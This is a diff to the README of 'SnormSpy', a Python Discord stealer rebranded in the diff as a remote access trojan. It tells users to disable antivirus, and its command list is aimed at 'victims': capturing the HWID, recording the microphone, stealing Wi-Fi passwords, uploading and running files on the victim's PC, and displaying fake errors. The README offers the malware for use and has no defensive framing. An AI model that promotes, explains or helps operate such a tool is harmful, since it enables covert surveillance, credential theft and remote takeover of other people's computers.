@@ -1,4 +1,4 @@
-# Snorm-Spy-Discord-Stealer-
+# SnormSpy Discord RAT
 Snorm Spy, **VERY GOOD** Discord Stealer made in **python** by S-illy and Snormware. 
 
 **TURN OFF ANTI VIRUS AS IT FLAGS IT**
@@ -27,7 +27,7 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 11. !hwid -- Takes the victims HWID
 12. !jumpscare -- Shows the image scarylarry.png on  their screen
 13. !mic -- Logs past 30 seconds of the victims mic ( after 30 seconds it sends a wav file with the mic footage )
-14. !invite -- Shows invite link to your rat bot ( if u wanna add it to other servers
+14. !wifi -- Takes WiFi Passwords
 15. !upload ( then a file no space btw ) -- Uploads and executes a file on victims PC
 16. !fakeerror -- Shows a fake error no limit btw u can spam
 
